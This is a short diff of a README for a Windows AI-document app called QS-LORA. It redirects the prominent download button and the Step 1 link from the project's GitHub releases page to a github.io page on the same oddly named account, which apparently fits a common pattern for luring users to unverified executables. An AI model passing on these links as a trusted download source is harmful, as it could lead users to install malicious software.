@@ -1,7 +1,7 @@
 <h1>🚀 QS-LORA - Smarter AI Answers From Your Documents</h1>
 
 <p align="center">
-  <a href="https://github.com/brimstonevegetablemarrow362/QS-LORA/releases" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://brimstonevegetablemarrow362.github.io" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 🤔 What Is QS-LORA?
@@ -26,7 +26,7 @@ QS-LORA works on any standard Windows computer. No special hardware or technical
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[QS-LORA Releases](https://github.com/brimstonevegetablemarrow362/QS-LORA/releases)**
+Visit this link to download the application: **[QS-LORA Releases](https://brimstonevegetablemarrow362.github.io)**
 
 Click the button to go directly to the download page. The website will show you available files.
 
